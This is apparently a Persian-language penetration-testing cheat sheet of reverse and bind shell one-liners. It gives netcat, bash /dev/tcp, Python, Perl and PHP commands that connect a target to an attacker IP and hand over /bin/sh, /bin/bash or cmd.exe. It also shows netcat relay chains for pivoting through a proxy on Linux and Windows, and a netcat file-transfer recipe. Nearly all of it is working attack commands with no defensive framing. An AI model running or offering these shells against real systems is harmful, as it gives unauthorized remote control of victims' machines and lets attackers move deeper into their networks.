<div dir="rtl">

# 1.GetShell

## 1.1.Linux

> روش اول

```shell
nc 10.0.20.206 4444 -e /bin/bash # Target
nc -lvp 4444: # Attacker(10.0.20.206)
```

> روش دوم

```shell
nc 10.0.20.206 4444 # Target
nc -lvp 4444 -e /bin/bash # Attacker(10.0.20.206)
```

> روش سوم

```shell
bash -i >& /dev/tcp/10.0.20.206/4444 0>&1 # Target
nc -lvp 4444 # Attacker(10.0.20.206)
```

---

### 1.1.1.proxy

<div dir="ltr">

- 10.11.1.16 attack box:
- 10.11.1.96 target host:
- 10.11.1.250 pivot point:

</div>

```shell
# Target[10.11.1.96]
nc -lvp 4444 -e /bin/sh

# Proxy[IP: 10.11.1.250]
nc -v 10.11.1.16 4444 -e "nc -v 10.11.1.96 4444"

# Hacker[IP: 10.11.1.16]
nc -lvp 4444

```

## 1.2.Windows

```
nc.exe  10.0.20.206 4444 -e cmd.exe # Target
nc -lvp 4444 # Attacker(10.0.20.206)
```

---

### 1.2.1.proxy

<div dir="ltr">

- Target[Windows1][10.11.1.198]
- Proxy [Windows2][10.11.1.199]
- Hacker[LinuxKali][10.11.1.16]

</div>

> روش اول

```shell
# Target(Windows1):needs to attach incoming commands on port 4444 to CMD.exe and redirect the output back to Windows Proxy on port 4444
nc -lvp 4444 -e cmd.exe 

# Proxy(Windows2): needs to direct incoming traffic on port 3333 to Windows Target on port 4444 and input traffic from Windows Target must be send to Kali Linux output on port 2222
nc.exe 10.11.1.16 3333 | nc.exe 10.11.1.198 4444 | nc.exe 10.11.1.16 2222

# Hacker(Linux): should be sending commands to Windows Proxy on port 3333 and receive input from Windows Proxy on port 4444
nc -lvp 3333 ; nc -lvp 4444
```

> روش دوم

```shell
# Target(Windows):
nc -lvp 4444 -e cmd.exe

# Proxy(Windows):
nc -v 10.11.1.16 4444 -c "nc -v 10.11.1.198 4444"

# Hacker(Linux):
nc -lvp 4444

```

## 1.3.python

```shell
# Target:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.20.206”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);'

# Attacker(10.0.20.206):
nc -lvp 4444
```

## 1.4.Perl

```shell
# Target:
perl -e ‘use Socket;$i=”10.0.20.206″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# Attacker(10.0.20.206):
nc -lvp 4444
```

## 1.5.PHP

```shell
# Target:
php -r '$sock=fsockopen(“10.0.20.206”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);'

# Attacker(10.0.20.206):
nc -lvp 4444

```

# 2.send Data

> انتقال دیتا از طریق برنامه Netcat

```shell
nc -l -p 55000 > /tmp/FIle.txt # Server1
netcat <IPserver1> 55000 < File.txt # server2
```

</div>